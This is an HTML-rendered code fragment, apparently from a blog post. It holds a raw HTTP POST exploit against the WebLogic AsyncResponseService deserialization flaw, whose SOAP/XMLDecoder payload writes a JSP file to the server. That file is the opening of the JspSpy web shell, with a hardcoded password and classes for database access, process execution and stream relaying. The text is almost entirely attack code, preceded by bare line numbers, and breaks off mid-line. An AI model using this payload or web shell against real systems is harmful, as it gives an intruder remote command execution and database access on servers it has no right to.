class="line">1859</span><br><span class="line">1860</span><br><span class="line">1861</span><br><span class="line">1862</span><br><span class="line">1863</span><br><span class="line">1864</span><br><span class="line">1865</span><br><span class="line">1866</span><br><span class="line">1867</span><br><span class="line">1868</span><br><span class="line">1869</span><br><span class="line">1870</span><br><span class="line">1871</span><br><span class="line">1872</span><br><span class="line">1873</span><br><span class="line">1874</span><br><span class="line">1875</span><br><span class="line">1876</span><br><span class="line">1877</span><br><span class="line">1878</span><br><span class="line">1879</span><br><span class="line">1880</span><br><span class="line">1881</span><br><span class="line">1882</span><br><span class="line">1883</span><br><span class="line">1884</span><br><span class="line">1885</span><br><span class="line">1886</span><br><span class="line">1887</span><br><span class="line">1888</span><br><span class="line">1889</span><br><span class="line">1890</span><br><span class="line">1891</span><br><span class="line">1892</span><br><span class="line">1893</span><br><span class="line">1894</span><br><span class="line">1895</span><br><span class="line">1896</span><br><span class="line">1897</span><br><span class="line">1898</span><br><span class="line">1899</span><br><span class="line">1900</span><br><span class="line">1901</span><br><span class="line">1902</span><br><span class="line">1903</span><br><span class="line">1904</span><br><span class="line">1905</span><br><span class="line">1906</span><br><span class="line">1907</span><br><span class="line">1908</span><br><span class="line">1909</span><br><span class="line">1910</span><br><span class="line">1911</span><br><span class="line">1912</span><br><span class="line">1913</span><br><span class="line">1914</span><br><span class="line">1915</span><br><span class="line">1916</span><br><span class="line">1917</span><br><span class="line">1918</span><br><span class="line">1919</span><br><span class="line">1920</span><br><span class="line">1921</span><br><span class="line">1922</span><br><span class="line">1923</span><br><span class="line">1924</span><br><span class="line">1925</span><br><span class="line">1926</span><br><span class="line">1927</span><br><span class="line">1928</span><br><span class="line">1929</span><br><span class="line">1930</span><br><span class="line">1931</span><br><span class="line">1932</span><br><span class="line">1933</span><br><span class="line">1934</span><br><span class="line">1935</span><br><span class="line">1936</span><br><span class="line">1937</span><br><span class="line">1938</span><br><span class="line">1939</span><br><span class="line">1940</span><br><span class="line">1941</span><br><span class="line">1942</span><br><span class="line">1943</span><br><span class="line">1944</span><br><span class="line">1945</span><br><span class="line">1946</span><br><span class="line">1947</span><br><span class="line">1948</span><br><span class="line">1949</span><br><span class="line">1950</span><br><span class="line">1951</span><br><span class="line">1952</span><br><span class="line">1953</span><br><span class="line">1954</span><br><span class="line">1955</span><br><span class="line">1956</span><br><span class="line">1957</span><br><span class="line">1958</span><br><span class="line">1959</span><br><span class="line">1960</span><br><span class="line">1961</span><br><span class="line">1962</span><br><span class="line">1963</span><br><span class="line">1964</span><br><span class="line">1965</span><br><span class="line">1966</span><br><span class="line">1967</span><br><span class="line">1968</span><br><span class="line">1969</span><br><span class="line">1970</span><br><span class="line">1971</span><br><span class="line">1972</span><br><span class="line">1973</span><br><span class="line">1974</span><br><span class="line">1975</span><br><span class="line">1976</span><br><span class="line">1977</span><br><span class="line">1978</span><br><span class="line">1979</span><br><span class="line">1980</span><br><span class="line">1981</span><br><span class="line">1982</span><br><span class="line">1983</span><br><span class="line">1984</span><br><span class="line">1985</span><br><span class="line">1986</span><br><span class="line">1987</span><br><span class="line">1988</span><br><span class="line">1989</span><br><span class="line">1990</span><br><span class="line">1991</span><br><span class="line">1992</span><br><span class="line">1993</span><br><span class="line">1994</span><br><span class="line">1995</span><br><span class="line">1996</span><br><span class="line">1997</span><br><span class="line">1998</span><br><span class="line">1999</span><br><span class="line">2000</span><br><span class="line">2001</span><br><span class="line">2002</span><br><span class="line">2003</span><br><span class="line">2004</span><br><span class="line">2005</span><br><span class="line">2006</span><br><span class="line">2007</span><br><span class="line">2008</span><br><span class="line">2009</span><br><span class="line">2010</span><br><span class="line">2011</span><br><span class="line">2012</span><br><span class="line">2013</span><br><span class="line">2014</span><br><span class="line">2015</span><br><span class="line">2016</span><br><span class="line">2017</span><br><span class="line">2018</span><br><span class="line">2019</span><br><span class="line">2020</span><br><span class="line">2021</span><br><span class="line">2022</span><br><span class="line">2023</span><br><span class="line">2024</span><br><span class="line">2025</span><br><span class="line">2026</span><br><span class="line">2027</span><br><span class="line">2028</span><br><span class="line">2029</span><br><span class="line">2030</span><br><span class="line">2031</span><br><span class="line">2032</span><br><span class="line">2033</span><br><span class="line">2034</span><br><span class="line">2035</span><br><span class="line">2036</span><br><span class="line">2037</span><br><span class="line">2038</span><br><span class="line">2039</span><br><span class="line">2040</span><br><span class="line">2041</span><br><span class="line">2042</span><br><span class="line">2043</span><br><span class="line">2044</span><br><span class="line">2045</span><br><span class="line">2046</span><br><span class="line">2047</span><br><span class="line">2048</span><br><span class="line">2049</span><br><span class="line">2050</span><br><span class="line">2051</span><br><span class="line">2052</span><br><span class="line">2053</span><br><span class="line">2054</span><br><span class="line">2055</span><br><span class="line">2056</span><br><span class="line">2057</span><br><span class="line">2058</span><br><span class="line">2059</span><br><span class="line">2060</span><br><span class="line">2061</span><br><span class="line">2062</span><br><span class="line">2063</span><br><span class="line">2064</span><br><span class="line">2065</span><br><span class="line">2066</span><br><span class="line">2067</span><br><span class="line">2068</span><br><span class="line">2069</span><br><span class="line">2070</span><br><span class="line">2071</span><br><span class="line">2072</span><br><span class="line">2073</span><br><span class="line">2074</span><br><span class="line">2075</span><br><span class="line">2076</span><br><span class="line">2077</span><br><span class="line">2078</span><br><span class="line">2079</span><br><span class="line">2080</span><br><span class="line">2081</span><br><span class="line">2082</span><br><span class="line">2083</span><br><span class="line">2084</span><br><span class="line">2085</span><br><span class="line">2086</span><br><span class="line">2087</span><br><span class="line">2088</span><br><span class="line">2089</span><br><span class="line">2090</span><br><span class="line">2091</span><br><span class="line">2092</span><br><span class="line">2093</span><br><span class="line">2094</span><br><span class="line">2095</span><br><span class="line">2096</span><br><span class="line">2097</span><br><span class="line">2098</span><br><span class="line">2099</span><br><span class="line">2100</span><br><span class="line">2101</span><br><span class="line">2102</span><br><span class="line">2103</span><br><span class="line">2104</span><br><span class="line">2105</span><br><span class="line">2106</span><br><span class="line">2107</span><br><span class="line">2108</span><br><span class="line">2109</span><br><span class="line">2110</span><br><span class="line">2111</span><br><span class="line">2112</span><br><span class="line">2113</span><br><span class="line">2114</span><br><span class="line">2115</span><br><span class="line">2116</span><br><span class="line">2117</span><br><span class="line">2118</span><br><span class="line">2119</span><br><span class="line">2120</span><br><span class="line">2121</span><br><span class="line">2122</span><br><span class="line">2123</span><br><span class="line">2124</span><br><span class="line">2125</span><br><span class="line">2126</span><br><span class="line">2127</span><br><span class="line">2128</span><br><span class="line">2129</span><br><span class="line">2130</span><br><span class="line">2131</span><br><span class="line">2132</span><br><span class="line">2133</span><br><span class="line">2134</span><br><span class="line">2135</span><br><span class="line">2136</span><br><span class="line">2137</span><br><span class="line">2138</span><br><span class="line">2139</span><br><span class="line">2140</span><br><span class="line">2141</span><br><span class="line">2142</span><br><span class="line">2143</span><br><span class="line">2144</span><br><span class="line">2145</span><br><span class="line">2146</span><br><span class="line">2147</span><br><span class="line">2148</span><br><span class="line">2149</span><br><span class="line">2150</span><br><span class="line">2151</span><br><span class="line">2152</span><br><span class="line">2153</span><br><span class="line">2154</span><br><span class="line">2155</span><br><span class="line">2156</span><br><span class="line">2157</span><br><span class="line">2158</span><br><span class="line">2159</span><br><span class="line">2160</span><br><span class="line">2161</span><br><span class="line">2162</span><br><span class="line">2163</span><br><span class="line">2164</span><br><span class="line">2165</span><br><span class="line">2166</span><br><span class="line">2167</span><br><span class="line">2168</span><br><span class="line">2169</span><br><span class="line">2170</span><br><span class="line">2171</span><br><span class="line">2172</span><br><span class="line">2173</span><br><span class="line">2174</span><br><span class="line">2175</span><br><span class="line">2176</span><br><span class="line">2177</span><br><span class="line">2178</span><br><span class="line">2179</span><br><span class="line">2180</span><br><span class="line">2181</span><br><span class="line">2182</span><br><span class="line">2183</span><br><span class="line">2184</span><br><span class="line">2185</span><br><span class="line">2186</span><br><span class="line">2187</span><br><span class="line">2188</span><br><span class="line">2189</span><br><span class="line">2190</span><br><span class="line">2191</span><br><span class="line">2192</span><br><span class="line">2193</span><br><span class="line">2194</span><br><span class="line">2195</span><br><span class="line">2196</span><br><span class="line">2197</span><br><span class="line">2198</span><br><span class="line">2199</span><br><span class="line">2200</span><br><span class="line">2201</span><br><span class="line">2202</span><br><span class="line">2203</span><br><span class="line">2204</span><br><span class="line">2205</span><br><span class="line">2206</span><br><span class="line">2207</span><br><span class="line">2208</span><br><span class="line">2209</span><br><span class="line">2210</span><br><span class="line">2211</span><br><span class="line">2212</span><br><span class="line">2213</span><br><span class="line">2214</span><br><span class="line">2215</span><br><span class="line">2216</span><br><span class="line">2217</span><br><span class="line">2218</span><br><span class="line">2219</span><br><span class="line">2220</span><br><span class="line">2221</span><br><span class="line">2222</span><br><span class="line">2223</span><br><span class="line">2224</span><br><span class="line">2225</span><br><span class="line">2226</span><br><span class="line">2227</span><br><span class="line">2228</span><br><span class="line">2229</span><br><span class="line">2230</span><br><span class="line">2231</span><br><span class="line">2232</span><br><span class="line">2233</span><br><span class="line">2234</span><br><span class="line">2235</span><br><span class="line">2236</span><br><span class="line">2237</span><br><span class="line">2238</span><br><span class="line">2239</span><br><span class="line">2240</span><br><span class="line">2241</span><br><span class="line">2242</span><br><span class="line">2243</span><br><span class="line">2244</span><br><span class="line">2245</span><br><span class="line">2246</span><br><span class="line">2247</span><br><span class="line">2248</span><br><span class="line">2249</span><br><span class="line">2250</span><br><span class="line">2251</span><br><span class="line">2252</span><br><span class="line">2253</span><br><span class="line">2254</span><br><span class="line">2255</span><br><span class="line">2256</span><br><span class="line">2257</span><br><span class="line">2258</span><br><span class="line">2259</span><br><span class="line">2260</span><br><span class="line">2261</span><br><span class="line">2262</span><br><span class="line">2263</span><br><span class="line">2264</span><br><span class="line">2265</span><br><span class="line">2266</span><br><span class="line">2267</span><br><span class="line">2268</span><br><span class="line">2269</span><br><span class="line">2270</span><br><span class="line">2271</span><br><span class="line">2272</span><br><span class="line">2273</span><br><span class="line">2274</span><br><span class="line">2275</span><br><span class="line">2276</span><br><span class="line">2277</span><br><span class="line">2278</span><br><span class="line">2279</span><br><span class="line">2280</span><br><span class="line">2281</span><br><span class="line">2282</span><br><span class="line">2283</span><br><span class="line">2284</span><br><span class="line">2285</span><br><span class="line">2286</span><br><span class="line">2287</span><br><span class="line">2288</span><br><span class="line">2289</span><br><span class="line">2290</span><br><span class="line">2291</span><br><span class="line">2292</span><br><span class="line">2293</span><br><span class="line">2294</span><br><span class="line">2295</span><br><span class="line">2296</span><br><span class="line">2297</span><br><span class="line">2298</span><br><span class="line">2299</span><br><span class="line">2300</span><br><span class="line">2301</span><br><span class="line">2302</span><br><span class="line">2303</span><br><span class="line">2304</span><br><span class="line">2305</span><br><span class="line">2306</span><br><span class="line">2307</span><br><span class="line">2308</span><br><span class="line">2309</span><br><span class="line">2310</span><br><span class="line">2311</span><br><span class="line">2312</span><br><span class="line">2313</span><br><span class="line">2314</span><br><span class="line">2315</span><br><span class="line">2316</span><br><span class="line">2317</span><br><span class="line">2318</span><br><span class="line">2319</span><br><span class="line">2320</span><br><span class="line">2321</span><br><span class="line">2322</span><br><span class="line">2323</span><br><span class="line">2324</span><br><span class="line">2325</span><br><span class="line">2326</span><br><span class="line">2327</span><br><span class="line">2328</span><br><span class="line">2329</span><br><span class="line">2330</span><br><span class="line">2331</span><br><span class="line">2332</span><br><span class="line">2333</span><br><span class="line">2334</span><br><span class="line">2335</span><br><span class="line">2336</span><br><span class="line">2337</span><br><span class="line">2338</span><br><span class="line">2339</span><br><span class="line">2340</span><br><span class="line">2341</span><br><span class="line">2342</span><br><span class="line">2343</span><br><span class="line">2344</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">POST /_async/AsyncResponseService HTTP/1.1</span></span><br><span class="line"><span class="xml">Host: 192.168.111.80:7001</span></span><br><span class="line"><span class="xml">Content-Length: 88076</span></span><br><span class="line"><span class="xml">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="xml">SOAPAction:</span></span><br><span class="line"><span class="xml">Accept: */*</span></span><br><span class="line"><span class="xml">User-Agent: Apache-HttpClient/4.1.1 (java 1.5)</span></span><br><span class="line"><span class="xml">Connection: keep-alive</span></span><br><span class="line"><span class="xml">content-type: text/xml</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span> <span class="attr">xmlns:wsa</span>=<span class="string">"http://www.w3.org/2005/08/addressing"</span> <span class="attr">xmlns:asy</span>=<span class="string">"http://www.bea.com/async/AsyncResponseService"</span>&gt;</span><span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span><span class="tag">&lt;<span class="name">wsa:Action</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:Action</span>&gt;</span><span class="tag">&lt;<span class="name">wsa:RelatesTo</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:RelatesTo</span>&gt;</span><span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.8.0_131"</span> <span class="attr">class</span>=<span class="string">"java.beans.xmlDecoder"</span>&gt;</span><span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">"java.io.PrintWriter"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/timor2.jsp<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"println"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>&lt;![CDATA[</span></span><br><span class="line"><span class="vbscript">&lt;%@page pageEncoding=<span class="string">"utf-8"</span>%&gt;</span></span><br><span class="line"><span class="vbscript">&lt;%@page import=<span class="string">"java.io.*"</span>%&gt;</span></span><br><span class="line"><span class="vbscript">&lt;%@page import=<span class="string">"java.util.*"</span>%&gt;</span></span><br><span class="line"><span class="vbscript">&lt;%@page import=<span class="string">"java.util.regex.*"</span>%&gt;</span></span><br><span class="line"><span class="vbscript">&lt;%@page import=<span class="string">"java.sql.*"</span>%&gt;</span></span><br><span class="line"><span class="vbscript">&lt;%@page import=<span class="string">"java.nio.charset.*"</span>%&gt;</span></span><br><span class="line"><span class="vbscript">&lt;%@page import=<span class="string">"javax.servlet.http.HttpServletRequestWrapper"</span>%&gt;</span></span><br><span class="line"><span class="vbscript">&lt;%@page import=<span class="string">"java.text.*"</span>%&gt;</span></span><br><span class="line"><span class="vbscript">&lt;%@page import=<span class="string">"java.net.*"</span>%&gt;</span></span><br><span class="line"><span class="vbscript">&lt;%@page import=<span class="string">"java.util.zip.*"</span>%&gt;</span></span><br><span class="line"><span class="vbscript">&lt;%@page import=<span class="string">"java.awt.*"</span>%&gt;</span></span><br><span class="line"><span class="vbscript">&lt;%@page import=<span class="string">"java.awt.image.*"</span>%&gt;</span></span><br><span class="line"><span class="vbscript">&lt;%@page import=<span class="string">"javax.imageio.*"</span>%&gt;</span></span><br><span class="line"><span class="vbscript">&lt;%@page import=<span class="string">"java.awt.datatransfer.DataFlavor"</span>%&gt;</span></span><br><span class="line"><span class="vbscript">&lt;%@page import=<span class="string">"java.util.prefs.Preferences"</span>%&gt;</span></span><br><span class="line"><span class="vbscript">&lt;%!</span></span><br><span class="line"></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static final <span class="built_in">String</span> PW = <span class="string">"timor"</span>; //password</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static final <span class="built_in">String</span> PW_SESSION_ATTRIBUTE = <span class="string">"JspSpyPwd"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static final <span class="built_in">String</span> REQUEST_CHARSET = <span class="string">"ISO-8859-1"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static final <span class="built_in">String</span> PAGE_CHARSET = <span class="string">"UTF-8"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static final <span class="built_in">String</span> CURRENT_DIR = <span class="string">"currentdir"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static final <span class="built_in">String</span> MSG = <span class="string">"SHOWMSG"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static final <span class="built_in">String</span> PORT_MAP = <span class="string">"PMSA"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static final <span class="built_in">String</span> DBO = <span class="string">"DBO"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static final <span class="built_in">String</span> SHELL_ONLINE = <span class="string">"SHELL_ONLINE"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="built_in">String</span> SHELL_NAME = <span class="string">""</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="built_in">String</span> WEB_ROOT = <span class="literal">null</span>; </span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="built_in">String</span> SHELL_DIR = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> static Map&lt;<span class="built_in">String</span>,Invoker&gt; ins = <span class="keyword">new</span> HashMap&lt;<span class="built_in">String</span>,Invoker&gt;();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> MyRequest extends HttpServletRequestWrapper &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> MyRequest(HttpServletRequest req) &#123;</span></span><br><span class="line"><span class="vbscript">super(req);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> <span class="built_in">String</span> getParameter(<span class="built_in">String</span> name) &#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> value = super.getParameter(name);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (name == <span class="literal">null</span>)</span></span><br><span class="line"><span class="vbscript">return <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript">return <span class="keyword">new</span> <span class="built_in">String</span>(value.getBytes(REQUEST_CHARSET),PAGE_CHARSET);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">return <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> DBOperator&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> Connection conn = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> Statement stmt = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> <span class="built_in">String</span> driver;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> <span class="built_in">String</span> url;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> <span class="built_in">String</span> uid;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> <span class="built_in">String</span> pwd;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> DBOperator(<span class="built_in">String</span> driver,<span class="built_in">String</span> url,<span class="built_in">String</span> uid,<span class="built_in">String</span> pwd) throws Exception &#123;</span></span><br><span class="line"><span class="vbscript">this(driver,url,uid,pwd,<span class="literal">false</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> DBOperator(<span class="built_in">String</span> driver,<span class="built_in">String</span> url,<span class="built_in">String</span> uid,<span class="built_in">String</span> pwd,boolean connect) throws Exception &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">Class</span>.forName(driver);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (connect)</span></span><br><span class="line"><span class="vbscript">this.conn = DriverManager.getConnection(url,uid,pwd);</span></span><br><span class="line"><span class="vbscript">this.url = url;</span></span><br><span class="line"><span class="vbscript">this.driver = driver;</span></span><br><span class="line"><span class="vbscript">this.uid = uid;</span></span><br><span class="line"><span class="vbscript">this.pwd = pwd;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void connect() throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">this.conn = DriverManager.getConnection(url,uid,pwd);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> Object <span class="keyword">execute</span>(<span class="built_in">String</span> sql) throws Exception &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (isValid()) &#123;</span></span><br><span class="line"><span class="vbscript">stmt = conn.createStatement();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (stmt.<span class="keyword">execute</span>(sql)) &#123;</span></span><br><span class="line"><span class="vbscript">return stmt.getResultSet();</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">return stmt.getUpdateCount();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">throw <span class="keyword">new</span> Exception(<span class="string">"Connection is inValid."</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void closeStmt() throws Exception&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (this.stmt != <span class="literal">null</span>)</span></span><br><span class="line"><span class="vbscript">stmt.close();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean isValid() throws Exception &#123;</span></span><br><span class="line"><span class="vbscript">return conn != <span class="literal">null</span> &amp;&amp; !conn.isClosed();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void close() throws Exception &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (isValid()) &#123;</span></span><br><span class="line"><span class="vbscript">closeStmt();</span></span><br><span class="line"><span class="vbscript">conn.close();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean equals(Object o) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (o instanceof DBOperator) &#123;</span></span><br><span class="line"><span class="vbscript">DBOperator dbo = (DBOperator)o;</span></span><br><span class="line"><span class="vbscript">return this.driver.equals(dbo.driver) &amp;&amp; this.url.equals(dbo.url) &amp;&amp; this.uid.equals(dbo.uid) &amp;&amp; this.pwd.equals(dbo.pwd);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">return <span class="literal">false</span>;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> StreamConnector extends Thread &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> InputStream <span class="keyword">is</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> OutputStream os;  </span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> StreamConnector( InputStream <span class="keyword">is</span>, OutputStream os )&#123;</span></span><br><span class="line"><span class="vbscript">this.<span class="keyword">is</span> = <span class="keyword">is</span>;</span></span><br><span class="line"><span class="vbscript">this.os = os;</span></span><br><span class="line"><span class="vbscript">&#125;			  </span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void run()&#123;</span></span><br><span class="line"><span class="vbscript">BufferedReader <span class="keyword">in</span>  = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript">BufferedWriter out = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript">try&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">in</span>  = <span class="keyword">new</span> BufferedReader( <span class="keyword">new</span> InputStreamReader(this.<span class="keyword">is</span>));</span></span><br><span class="line"><span class="vbscript">out = <span class="keyword">new</span> BufferedWriter( <span class="keyword">new</span> OutputStreamWriter(this.os));</span></span><br><span class="line"><span class="vbscript">char buffer[] = <span class="keyword">new</span> char[<span class="number">8192</span>];</span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> length;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span>((length = <span class="keyword">in</span>.read( buffer, <span class="number">0</span>, buffer.length ))&gt;<span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="vbscript">out.write( buffer, <span class="number">0</span>, length );</span></span><br><span class="line"><span class="vbscript">out.flush();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125; catch(Exception e)&#123;&#125;</span></span><br><span class="line"><span class="vbscript">try&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span>(<span class="keyword">in</span> != <span class="literal">null</span>)</span></span><br><span class="line"><span class="vbscript"><span class="keyword">in</span>.close();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span>(out != <span class="literal">null</span>)</span></span><br><span class="line"><span class="vbscript">out.close();</span></span><br><span class="line"><span class="vbscript">&#125; catch( Exception e )&#123;&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> OnLineProcess &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> <span class="built_in">String</span> cmd = <span class="string">"first"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> Process pro;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> OnLineProcess(Process p)&#123;</span></span><br><span class="line"><span class="vbscript">this.pro = p;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void setPro(Process p) &#123;</span></span><br><span class="line"><span class="vbscript">this.pro = p;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void setCmd(<span class="built_in">String</span> c)&#123;</span></span><br><span class="line"><span class="vbscript">this.cmd = c;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> <span class="built_in">String</span> getCmd()&#123;</span></span><br><span class="line"><span class="vbscript">return this.cmd;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> Process getPro()&#123;</span></span><br><span class="line"><span class="vbscript">return this.pro;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void <span class="keyword">stop</span>()&#123;</span></span><br><span class="line"><span class="vbscript">this.pro.destroy();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> OnLineConnector extends Thread &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> OnLineProcess ol = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> InputStream <span class="keyword">is</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> OutputStream os;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> <span class="built_in">String</span> name;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> OnLineConnector( InputStream <span class="keyword">is</span>, OutputStream os ,<span class="built_in">String</span> name,OnLineProcess ol)&#123;</span></span><br><span class="line"><span class="vbscript">this.<span class="keyword">is</span> = <span class="keyword">is</span>;</span></span><br><span class="line"><span class="vbscript">this.os = os;</span></span><br><span class="line"><span class="vbscript">this.name = name;</span></span><br><span class="line"><span class="vbscript">this.ol = ol;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void run()&#123;</span></span><br><span class="line"><span class="vbscript">BufferedReader <span class="keyword">in</span>  = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript">BufferedWriter out = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript">try&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">in</span>  = <span class="keyword">new</span> BufferedReader( <span class="keyword">new</span> InputStreamReader(this.<span class="keyword">is</span>));</span></span><br><span class="line"><span class="vbscript">out = <span class="keyword">new</span> BufferedWriter( <span class="keyword">new</span> OutputStreamWriter(this.os));</span></span><br><span class="line"><span class="vbscript">char buffer[] = <span class="keyword">new</span> char[<span class="number">128</span>];</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span>(this.name.equals(<span class="string">"exeRclientO"</span>)) &#123;</span></span><br><span class="line"><span class="vbscript">//from exe <span class="keyword">to</span> client</span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> length = <span class="number">0</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span>((length = <span class="keyword">in</span>.read( buffer, <span class="number">0</span>, buffer.length ))&gt;<span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> str = <span class="keyword">new</span> <span class="built_in">String</span>(buffer, <span class="number">0</span>, length);</span></span><br><span class="line"><span class="vbscript">str = str.<span class="built_in">replace</span>(<span class="string">"&amp;"</span>,<span class="string">"&amp;amp;"</span>).<span 